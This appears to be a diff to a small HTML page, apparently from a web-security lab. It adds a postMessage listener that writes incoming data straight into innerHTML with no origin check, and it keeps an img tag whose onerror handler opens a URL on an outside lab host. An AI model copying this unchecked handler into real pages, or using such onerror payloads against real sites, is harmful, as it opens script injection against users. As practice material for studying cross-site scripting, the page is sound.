@@ -2,8 +2,7 @@
 <html>
 <body>
    <script>
-    (window.addEventListener){
-        console.log(value)
+    window.addEventListener("message", function(event){document.getElementById("value"+event.data.id).innerHTML = event.data.value;}, false);
     </script>
    <img src=x onerror="window.open('http://ptl-887b28a4-4f0bc94a.libcurl.so/key/0')">
 </body>
